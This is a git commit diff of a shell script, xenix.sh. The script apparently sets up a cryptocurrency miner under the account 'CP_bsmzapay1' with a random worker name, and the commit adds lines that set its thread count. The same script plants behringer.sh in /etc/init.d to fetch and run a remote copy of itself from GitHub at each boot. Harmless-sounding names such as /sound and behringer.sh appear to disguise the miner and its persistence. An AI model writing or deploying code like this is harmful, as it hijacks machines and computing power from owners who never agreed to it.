0dc0018ff7d9f164ec3524b1101f13d0f08d14ed
gallusebi <galluselbi@gmail.com>
2024-05-31 18:41:20 +0700

    Update xenix.sh

--- xenix.sh
+++ xenix.sh
@@ -7,6 +7,8 @@ cd /sound
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
 sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
+sed -i "s/test_thread/10 --thread ${variable1}/g" ./amd.sh
+sed -i "s/13/10 --thread ${variable1}/g" ./amd.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > behringer.sh
 chmod a+x behringer.sh
